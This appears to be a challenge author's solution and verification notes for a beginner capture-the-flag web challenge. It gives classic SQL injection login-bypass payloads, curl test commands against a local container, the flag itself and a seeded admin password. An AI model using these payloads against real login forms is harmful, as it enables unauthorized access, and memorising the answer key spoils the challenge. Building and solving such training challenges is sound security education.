# Solution — The Drowned Admin

## Intended solve

1. **Visit the login page** (~1 min). Browser navigation; observe the username/password form.
2. **Probe with a single quote** in the username field (`'`). Server returns a verbose SQL error referencing a `sqlite3.OperationalError` near `'`. Tools: any browser. (~2 min)
3. **Recognize string-concatenation SQLi.** Try the canonical bypass payload in the username field:
   - Username: `' OR '1'='1' --`
   - Password: anything
   The query becomes `SELECT * FROM admins WHERE username='' OR '1'='1' --' AND password='...'` and returns the first admin row. (~3 min)
4. **Land on the dashboard.** The page renders a banner that reads `Welcome back, Eli. Your treasure is safe: progctf{...}`. Copy the flag. (~1 min)

## Total estimated time: 5–10 minutes

## Why this is Port-tier
- Single technique (classic in-band SQL injection on a login form).
- Error message itself names the database engine — no guessing.
- No chaining, no auxiliary tooling needed. A browser is enough.
- Beginner who has read any "SQLi 101" article will land it.

## Acceptable variant payloads
- `admin' --`
- `' OR 1=1 --`
- `' OR 'a'='a' --`

All of these MUST authenticate as the first admin row. Powder Monkey: ensure the SELECT returns admin rows ordered such that "Eli" is first, since the dashboard banner is keyed off the authenticated username.

## Verification

Built artifacts (`src/app.js`, `src/init-db.js`, `src/views/`, `Dockerfile`, `package.json`) cold-solved on 2026-05-01 against a locally-launched container surrogate (`PORT=8181 CHALLENGE_FLAG=$(cat flag.txt) node src/app.js`):

```
$ curl -s -X POST -d "username=%27&password=x" http://127.0.0.1:8181/login | grep -E "Database error|SQLITE"
    <pre class="err">Database error: SQLITE_ERROR: SQLITE_ERROR: unrecognized token: "x'"

$ curl -s -X POST --data-urlencode "username=' OR '1'='1' --" --data "password=x" \
       http://127.0.0.1:8181/login | grep -o "Welcome back[^<]*"
Welcome back, Eli. Your treasure is safe: progctf{drowned_eli_forgot_to_escape}
```

Unintended-solve traps from `spec.yaml` were each probed and confirmed:

```
$ curl -s -o /tmp/empty.html -w "status=%{http_code}\n" -X POST -d "username=&password=" http://127.0.0.1:8181/login
status=400
$ grep -c 'progctf{' /tmp/empty.html
0

$ curl -s -D /tmp/hdr -o /dev/null http://127.0.0.1:8181/login && grep -ci progctf /tmp/hdr
0

$ curl -s http://127.0.0.1:8181/login | grep -c 'progctf{'
0

$ for p in /admin /robots.txt /.git/HEAD /backup.sql /env /debug /.env; do
>   printf '%-12s -> ' "$p"; curl -s -o /dev/null -w "%{http_code}\n" "http://127.0.0.1:8181$p"
> done
/admin       -> 404
/robots.txt  -> 404
/.git/HEAD   -> 404
/backup.sql  -> 404
/env         -> 404
/debug       -> 404
/.env        -> 404

$ curl -s -X POST --data-urlencode "username=Eli" --data-urlencode "password=k3lpdr@gger_99" \
       http://127.0.0.1:8181/login | grep -o "Welcome back[^<]*" | head -1
Welcome back, Eli. Your treasure is safe: progctf{drowned_eli_forgot_to_escape}
```

- Single quote in the username field surfaces a verbose `SQLITE_ERROR` block — engine name is leaked exactly as the spec demands.
- Tautology bypass (`' OR '1'='1' --`) returns the dashboard banner with the flag, with `Eli` echoed as expected (Eli seeded as id=1).
- Empty form rejected with HTTP 400 and zero flag bytes in the body.
- Flag does not appear in any response header on the login page.
- Flag does not appear in the unauthenticated login HTML.
- All non-`/login`, non-`/healthz` paths return a terse `404 Not found.` — no verbose stack traces leak elsewhere.
- Genuine credentials (out-of-band) also work, confirming the login route is not broken in the non-SQLi path.
